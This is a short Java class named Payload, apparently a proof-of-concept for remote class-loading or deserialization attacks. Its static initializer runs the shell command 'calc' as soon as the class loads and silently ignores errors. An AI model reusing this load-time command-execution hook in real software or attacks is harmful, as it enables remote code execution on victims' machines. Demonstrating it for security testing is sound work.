package codebase.client;
import java.util.List;
import java.util.ArrayList;

public class Payload extends ArrayList{
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pc = rt.exec("calc");
            pc.waitFor();
        } catch (Exception e) {
            // do nothing;
        }
    }
}
